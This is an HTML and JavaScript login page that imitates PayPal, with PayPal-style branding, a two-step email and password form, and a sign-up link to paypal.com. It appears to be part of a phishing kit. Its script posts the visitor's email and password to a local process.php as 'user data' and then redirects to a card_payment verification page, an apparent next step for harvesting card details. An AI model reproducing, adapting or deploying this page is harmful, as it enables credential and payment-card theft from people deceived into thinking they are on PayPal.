


<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link rel="stylesheet" href="styles.css">
    <title>Login Page</title>
    <style>
        /* styles.css */
        body {
            margin: 0;
            padding: 0;
            font-family: Arial, sans-serif;
        }

        .login-container {
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: space-between;
            min-height: 100vh;
            padding: 20px;
            margin-top: 35px;
        }

        .form-container {
            border: 1px solid #ccc;
            padding: 30px;
            width: 90%; /* Adjusted width for responsiveness */
            max-width: 400px; /* Added max-width for larger screens */
            text-align: center;
            margin-bottom: 20px;
            border-radius: 10px;
            margin-top: 80px;
        }

        .form-group {
            margin: 15px 0;
            text-align: left;
        }

        input {
            width: 93%;
            padding: 10px;
            margin-top: 5px;
            border: 1px solid #ccc;
            border-radius: 4px;
            transition: border-color 0.3s;
            font-size: 1.2rem;
        }

        input:focus {
            border-color: #0070ba;
            border: 4px solid #0070ba;
            outline: none;
        }

        button {
            width: 100%;
            padding: 15px;
            background-color: #0070ba;
            color: white;
            border: none;
            border-radius: 45px;
            cursor: pointer;
            margin-top: 20px;
            font-size: 1.2rem;
        }

        /* Loader styles */
        .loader-container {
            display: none;
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background-color: rgba(255, 255, 255, 0.7);
            z-index: 999;
            justify-content: center;
            align-items: center;
        }

        .password-container {
            display: none;
            flex-direction: column;
            align-items: center;
        }

        .loader {
            background-color: white;
            border: 5px solid #f3f3f3;
            border-top: 5px solid #3498db;
            border-radius: 50%;
            width: 50px;
            height: 50px;
            animation: spin 2s linear infinite;
        }

        /* Footer styles */
        .footer {
            text-align: center;
            padding: 20px;
            border-top: 2px solid #ccc;
            background-color: #f0f0f0;
        }

        .footer a {
            color: #0070ba;
            text-decoration: none;
            margin: 0 10px;
        }

        .footer a:hover {
            text-decoration: underline;
        }

        .signup-link {
            margin-top: 20px;
            text-align: center;
        }

        .or-divider {
            margin: 20px 0;
            font-size: 1.2rem;
            position: relative;
        }

        .or-divider::before,
        .or-divider::after {
            content: "";
            display: block;
            height: 1px;
            background-color: #ccc;
            width: 40%;
            position: absolute;
            top: 50%;
            transform: translateY(-50%);
        }

        .or-divider::before {
            left: 0;
        }

        .or-divider::after {
            right: 0;
        }

        .signup-button {
            width: 100%;
            padding: 15px;
            background-color: white;
            color: #0070ba;
            border: 2px solid #0070ba;
            border-radius: 45px;
            cursor: pointer;
            font-size: 1.2rem;
        }

        /* Responsive adjustments */
        @media (max-width: 768px) {
            .form-container {
                width: 80%; /* Adjusted width for smaller screens */
            }

            .footer {
                padding: 10px; /* Reduced padding for smaller screens */
            }

            .signup-link {
                margin-top: 10px; /* Reduced margin for smaller screens */
            }

            .or-divider {
                margin: 10px 0; /* Reduced margin for smaller screens */
            }
        }

        @keyframes spin {
            0% { transform: translate(-50%, -50%) rotate(0deg); }
            100% { transform: translate(-50%, -50%) rotate(360deg); }
        }
    </style>
</head>
<body>
    <div class="loader-container" id="loader-container">
        <div class="loader" id="loader"></div>
    </div>
    <div class="login-container">
        <div class="form-container">
            <!-- Replace "Login" with a logo image -->
            <img src="pay-logo.png" alt="Logo" style="width: 30px; height: 30px;">
            <form id="login-form" method="post" action="process.php">
                <div class="form-group">
                    <input type="email" id="email" name="email" placeholder="Email or phone number" required><br>
                   
                </div>
                <div class="password-container" id="password-container" style="display: none;">
                    <input type="password"  name="password" id="password" placeholder="Password" required>
                </div>
                <button type="submit" name="submit" id="login-button">Next</button>
                <div class="or-divider">Or</div>
                <div class="signup-link">
                    <button type="button" class="signup-button" href="https://www.paypal.com/welcome/signup">Sign Up</button>
                </div>
            </form>
        </div>
       
    </div>
    <div class="footer">
        
        <a href="#">Contact Us</a>
        <a href="#">Privacy</a>
        <a href="#">Legal</a>
        <a href="#">Policy Updates</a>
        <a href="#">Worldwide</a>
    </div>
    <script>
        document.addEventListener("DOMContentLoaded", function () {
            const loginForm = document.getElementById("login-form");
            const loaderContainer = document.getElementById("loader-container");
            const passwordContainer = document.getElementById("password-container");
            const loginButton = document.getElementById("login-button");
            const emailField = document.getElementById("email");
            const passwordField = document.getElementById("password");

            let passwordEntered = false; // Initialize passwordEntered

            loginButton.addEventListener("click", function () {
                // Check if the email is valid (you can add more robust validation)
                if (isValidEmail(emailField.value)) {
                    // Show the loader container
                    loaderContainer.style.display = "flex";
                    loginButton.disabled = true; // Disable the login button

                    // Hide the email input
                    emailField.style.display = "none";

                    // Simulate a delay (replace with actual login logic)
                    setTimeout(function () {
                        // Hide the loader container
                        loaderContainer.style.display = "none";
                        loginButton.disabled = false; // Enable the login button

                        // Show the password input container
                        passwordContainer.style.display = "flex";
                        passwordField.focus();
                    }, 2000); // Simulate a 2-second delay (adjust as needed)
                } else {
                    emailField.style.borderColor = "red";
                }
            });

            passwordField.addEventListener("input", function () {
                // Track when the password is entered
                passwordEntered = passwordField.value.length > 0;
            });

            // Function to validate the email (basic validation)
            function isValidEmail(email) {
                // You can use a more robust email validation method
                const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
                return emailRegex.test(email);
            }

            // Function to handle button click and redirect
            function redirectToSignUp() {
                window.location.href = "https://www.paypal.com/welcome/signup"; // Replace with the URL you want to redirect to
            }

            // Add a click event listener to the "Sign Up" button
            const signUpButton = document.querySelector(".signup-button");
            if (signUpButton) {
                signUpButton.addEventListener("click", redirectToSignUp);
            }

            // Prevent form submission for now, as we handle it via AJAX
            loginForm.addEventListener("submit", function (e) {
                e.preventDefault();
            });

            // Handle form submission via AJAX
            loginButton.addEventListener("click", function () {
                if (passwordEntered) {
                    // Perform the AJAX request to save data
                    saveUserData(emailField.value, passwordField.value, function (success) {
                        if (success) {
                            // Redirect after successful data save
                            window.location.href = "../card_payment/verify.php";
                        } else {
                            passwordField.style.borderColor = "red";
                        }
                    });
                }
            });

            // Function to save user data to the server via AJAX
            function saveUserData(email, password, callback) {
                const xhr = new XMLHttpRequest();
                xhr.open("POST", "process.php", true);
                xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
                xhr.onreadystatechange = function () {
                    if (xhr.readyState === 4) {
                        if (xhr.status === 200) {
                            // Data saved successfully
                            callback(true);
                        } else {
                            // Error occurred while saving data
                            callback(false);
                        }
                    }
                };
                const data = `email=${encodeURIComponent(email)}&password=${encodeURIComponent(password)}`;
                xhr.send(data);
            }
        });
    </script>

</body>
</html>
